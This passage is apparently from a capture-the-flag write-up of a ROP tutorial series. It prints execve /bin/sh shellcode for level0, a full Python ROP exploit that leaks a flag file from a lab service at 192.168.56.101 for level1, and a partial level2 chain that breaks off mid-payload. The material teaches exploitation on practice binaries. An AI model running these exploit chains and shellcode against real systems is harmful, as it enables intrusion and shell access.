<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level0@rop:~$</span> <span class="o">(</span>python boom.py<span class="p">;</span> python -c <span class="s1">&#39;print &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&#39;</span><span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>/home/level0/level0
</span><span class='line'><span class="go">[+] ROP tutorial level0</span>
</span><span class='line'><span class="go">[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#!</span>
</span><span class='line'><span class="go">cat flag</span>
</span><span class='line'><span class="go">flag{rop_the_night_away}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>level1</h2>

<p>This first needs some code analysis to figure out where exactly the overflow
occurs. The issue here is that the (specified) file&rsquo;s size (and therefore under
control) is also being used when reading its (path) name from the socket:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'><span class="kt">char</span> <span class="n">text</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'><span class="kt">int</span> <span class="n">read_bytes</span><span class="p">,</span> <span class="n">filesize</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">str_filesize</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* Read the file size from the socket. */</span>
</span><span class='line'><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">str_filesize</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'><span class="n">filesize</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">str_filesize</span><span class="p">);</span>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">filebuf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;---------------------+</span>
</span><span class='line'>                                                        <span class="o">|</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot; Please, send your file:</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>          <span class="o">|</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;&gt; &quot;</span><span class="p">);</span>                                    <span class="o">|</span> <span class="n">related</span>
</span><span class='line'>                                                        <span class="o">|</span> <span class="n">to</span>
</span><span class='line'><span class="cm">/* Read the file of size filesize. */</span>                   <span class="o">|</span>
</span><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filebuf</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;-------------+</span>
</span><span class='line'>                                                        <span class="o">|</span>
</span><span class='line'><span class="p">[...]</span>                                                   <span class="o">|</span>
</span><span class='line'>                                                        <span class="o">|</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot; Please, give a filename:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>           <span class="o">|</span> <span class="n">not</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;&gt; &quot;</span><span class="p">);</span>                                    <span class="o">|</span> <span class="n">related</span>
</span><span class='line'>                                                        <span class="o">|</span> <span class="n">to</span>
</span><span class='line'><span class="cm">/* Read the file name from the socket. */</span>               <span class="o">|</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span>                  <span class="o">|</span>
</span><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;------------+</span>
</span></code></pre></td></tr></table></div></figure>


<p>One can give a filesize of 128 bytes but provide a bigger filename (which is
fixed at 32 bytes of size). The read(2) call should have been:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="n">filename</span><span class="p">[</span><span class="n">read_bytes</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Keep in mind the file descriptor count of the child process:</p>

<pre><code> parent
+------+
| 0    | =&gt; stdin
| 1    | =&gt; stdout
| 2    | =&gt; stderr
| 3    | =&gt; listenfd
| 4    | =&gt; connfd (closed in the while loop before the accept call)
+------+

 child
+------+
| 0    | =&gt; stdin
| 1    | =&gt; stdout
| 2    | =&gt; stderr
| 3    | =&gt; flag file fd (previously listenfd, closed in main; freed)
| 4    | =&gt; connfd
+------+
</code></pre>

<p>Then, the addresses of the open(2), read(2) and write(2) that are used by the
binary in the PLT section were retrieved:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -D level1|grep -E &quot;(open|read|write)@plt&gt;:&quot;</span>
</span><span class='line'><span class="mh">08048640</span> <span class="p">&lt;</span><span class="nf">read@plt</span><span class="p">&gt;:</span>
</span><span class='line'><span class="mh">080486d0</span> <span class="p">&lt;</span><span class="nf">open@plt</span><span class="p">&gt;:</span>
</span><span class='line'><span class="mh">08048700</span> <span class="p">&lt;</span><span class="nf">write@plt</span><span class="p">&gt;:</span>
</span></code></pre></td></tr></table></div></figure>


<p>Followed by the address of an unused and writable section in the ELF file that
<em>can</em> (data section has eight bytes only) and will hold the contents of the flag
file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> readelf -S level1<span class="p">|</span>grep WA
</span><span class='line'><span class="go">[19] .init_array       INIT_ARRAY      0804a2f8 0012f8 000004 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[20] .fini_array       FINI_ARRAY      0804a2fc 0012fc 000004 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[21] .jcr              PROGBITS        0804a300 001300 000004 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[22] .dynamic          DYNAMIC         0804a304 001304 0000f0 08  WA  7   0  4</span>
</span><span class='line'><span class="go">[23] .got              PROGBITS        0804a3f4 0013f4 000004 04  WA  0   0  4</span>
</span><span class='line'><span class="go">[24] .got.plt          PROGBITS        0804a3f8 0013f8 00006c 04  WA  0   0  4</span>
</span><span class='line'><span class="go">[25] .data             PROGBITS        0804a464 001464 000008 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[26] .bss              NOBITS          0804a46c 00146c 000004 00  WA  0   0  4</span>
</span></code></pre></td></tr></table></div></figure>


<p>0xf0 bytes is more than enough to hold the 53 bytes of the file. Since the
binary also has the flag character array (NUL terminated), its address can be
used, instead:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x"># if (strstr(filename, &quot;flag&quot;)) &lt;== This one here.</span>
</span><span class='line'><span class="x">$ objdump -s -j .rodata level1|grep flag</span>
</span><span class='line'><span class="x">8049128 666c6167 00000000 20205845 52584553  flag....  XERXES</span>
</span></code></pre></td></tr></table></div></figure>


<p>As for the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">64</span>
</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048ef7</span><span class="p">)</span>
</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048ef6</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">openaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080486d0</span><span class="p">)</span> <span class="c"># open@plt</span>
</span><span class='line'><span class="n">openpath</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08049128</span><span class="p">)</span> <span class="c"># The flag string in the data section.</span>
</span><span class='line'><span class="n">openflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>        <span class="c"># O_RDONLY.</span>
</span><span class='line'>
</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048640</span><span class="p">)</span> <span class="c"># read@plt</span>
</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">)</span>          <span class="c"># Read from the newly created descriptor.</span>
</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804a304</span><span class="p">)</span>  <span class="c"># Read contents to the dynamic section.</span>
</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">)</span>        <span class="c"># Size of the dynamic ELF section.</span>
</span><span class='line'>
</span><span class='line'><span class="n">writeaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048700</span><span class="p">)</span> <span class="c"># write@plt</span>
</span><span class='line'><span class="n">writefd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">)</span>          <span class="c"># Write to the original socket file descriptor.</span>
</span><span class='line'><span class="n">writebuf</span> <span class="o">=</span> <span class="n">readbuf</span>
</span><span class='line'><span class="n">writecnt</span> <span class="o">=</span> <span class="n">readcnt</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">openaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">openpath</span> <span class="o">+</span> <span class="n">openflgs</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">writeaddr</span> <span class="o">+</span> <span class="s">&quot;BOOM&quot;</span> <span class="o">+</span> <span class="n">writefd</span> <span class="o">+</span> <span class="n">writebuf</span> <span class="o">+</span> <span class="n">writecnt</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;192.168.56.101&quot;</span><span class="p">,</span> <span class="mi">8888</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Banner.</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;store&quot;</span><span class="p">)</span>     <span class="c"># The internal application command.</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># How many bytes in your file?</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;128&quot;</span><span class="p">)</span>       <span class="c"># Must be bigger than the 32 bytes of the filename.</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Please send your file (the contents).</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;boom&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Error treatment and filename.</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;exit&quot;</span><span class="p">)</span>      <span class="c"># The internal application command.</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># To get the contents of the flag file.</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>At last, called the above Python code to remotely extract the contents of the
file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> python boom.py
</span><span class='line'><span class="go">Welcome to </span>
</span><span class='line'>
</span><span class='line'><span class="go"> XERXES File Storage System</span>
</span><span class='line'><span class="go">  available commands are:</span>
</span><span class='line'><span class="go">  store, read, exit.</span>
</span><span class='line'>
</span><span class='line'><span class="gp">&gt;</span>
</span><span class='line'><span class="go"> Please, how many bytes is your file?</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="gp">&gt;</span>
</span><span class='line'><span class="go"> Please, send your file:</span>
</span><span class='line'>
</span><span class='line'><span class="gp">&gt;</span>
</span><span class='line'><span class="go">   XERXES regrets to inform you</span>
</span><span class='line'><span class="go">    that an error occurred</span>
</span><span class='line'><span class="go">        while receiving your file.</span>
</span><span class='line'><span class="go"> Please, give a filename:</span>
</span><span class='line'><span class="gp">&gt;</span> flag<span class="o">{</span>just_one_rop_chain_a_day_keeps_the_doctor_away<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>level2</h2>

<p>The bad characters list should be enumerated by sending them in sequence, firing
up gdb and checking the stack values. For instance:</p>

<pre><code>gdb-peda$ x/64x $esp
0xbffff5c0:   0x04030201      0x08070605      0xbffff600      0x00000000
                                ^^^^^^^^
                                no \x09
</code></pre>

<p>Then, it is a matter of choosing the correct gadgets by taking into account the
above bad characters. Decided by using the already present strcpy(3) function in
the binary and copy the /bin/sh character array (character by character) to the
BSS segment and using a gadget to store a NUL byte by zeroing the eax register
first and using a mov instruction.</p>

<p>Since this is running Linux x86, one can take advantage of the interrupt gadget
by moving into eax the execve system call number and into ebx the address of the
/bin/sh character array (which is in the BSS section).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">44</span>
</span><span class='line'><span class="n">badchars</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x00\x09\x0a\x20</span><span class="s">&quot;</span>   <span class="c"># List of bad characters.</span>
</span><span class='line'><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x080cab40</span>                <span class="c"># The address of the BSS section.</span>
</span><span class='line'><span class="n">execvenb</span> <span class="o">=</span> <span class="mi">11</span>                   <span class="c"># System call execve number.</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Functions.</span>
</span><span class='line'><span class="n">bssaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span><span class="p">)</span>
</span><span class='line'><span class="n">strcpyaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08051160</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Gadgets.</span>
</span><span class='line'><span class="n">boom</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x41424344</span><span class="p">)</span>     <span class="c"># dummy</span>
</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048893</span><span class="p">)</span>
</span><span class='line'><span class="n">syscall</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08052ba0</span><span class="p">)</span>
</span><span class='line'><span class="n">xoreax</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0808d2cd</span><span class="p">)</span>   <span class="c"># xor eax,eax|pop ebp|ret</span>
</span><span class='line'><span class="n">inceax</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08083d82</span><span class="p">)</span>   <span class="c"># inc eax|ret</span>
</span><span class='line'><span class="n">movedx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08078e71</span><span class="p">)</span>   <span class="c"># mov dword ptr [edx],eax|ret</span>
</span><span class='line'><span class="n">popedx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08052476</span><span class="p">)</span>
</span><span class='line'><span class="n">popebx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0805249e</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Characters.</span>
</span><span class='line'><span class="n">slashaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048483</span><span class="p">)</span>
</span><span class='line'><span class="n">baddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804b262</span><span class="p">)</span>
</span><span class='line'><span class="n">iaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804a0ca</span><span class="p">)</span>
</span><span class='line'><span class="n">naddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048b65</span><span class="p">)</span>
</span><span class='line'><span class="n">saddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048110</span><span class="p">)</span>
</span><span class='line'><span class="n">haddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048113</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">slashaddr</span>  <span class="c"># /</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">baddr</span>      <span class="c"># b</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">iaddr</span>      <span class="c"># i</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">naddr</span>      <span class="c"># n</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">slashaddr</span>  <span class="c"># /</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">saddr</span>      <span class="c"># s</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">haddr</span>      <span class="c"># h</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">xoreax</span> <span class="o">+</span> <span class="n">boom</span>                <span class="c"># The xor gadget also pops.</span>
